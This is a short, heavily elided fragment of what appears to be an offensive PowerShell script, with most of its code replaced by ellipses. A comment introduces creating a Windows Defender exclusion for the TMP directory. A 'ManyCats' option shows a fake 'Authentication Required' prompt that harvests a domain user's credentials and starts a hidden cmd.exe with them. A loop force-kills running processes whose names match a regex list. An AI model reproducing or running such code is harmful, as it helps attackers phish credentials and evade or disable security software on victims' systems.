...
## Create TMP% directory excluion in windows Defender
...
If($ManyCats.IsPresent)
{
   ...
   If($RunAs.IsPresent)
   {
      ...
      $Creds = (Get-Credential -UserName "$DcName" -Message "Authentication Required")
      Start-Process -WindowStyle minimized cmd.exe -Credential "$Creds"
      write-host ""
   }
   ...
   ForEach($Item in $Regex)
   {
      ...
      If($Testme -iMatch "$Item")
      {
         ...
         taskkill /IM "${Item}.exe" /F|Out-Null # Try to stop comrrespondent process name
      }
   }
